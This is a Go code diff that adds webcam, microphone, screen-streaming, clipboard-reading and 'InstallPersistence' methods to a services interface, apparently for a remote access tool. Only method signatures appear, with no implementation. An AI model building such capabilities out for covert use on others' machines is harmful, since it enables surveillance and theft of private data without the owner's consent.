@@ -14,6 +14,9 @@ type Services struct {
 	Information
 	Terminal
 	Screenshot
+	Webcam
+	Microphone
+	ScreenStream
 	Download
 	Upload
 	Delete
@@ -31,7 +34,19 @@ type Terminal interface {
 }
 
 type Screenshot interface {
-	TakeScreenshot() ([]byte, error)
+	TakeScreenshot(quality int) ([]byte, error)
+}
+
+type Webcam interface {
+	CaptureWebcam(quality int) ([]byte, error)
+}
+
+type Microphone interface {
+	CaptureAudio(duration int, quality int) ([]byte, error)
+}
+
+type ScreenStream interface {
+	StartScreenStream(duration int) ([]byte, error)
 }
 
 type Upload interface {
@@ -55,6 +70,8 @@ type OS interface {
 	Shutdown() error
 	Lock() error
 	SignOut() error
+	InstallPersistence() error
+	GetClipboard() (string, error)
 }
 
 type Url interface {
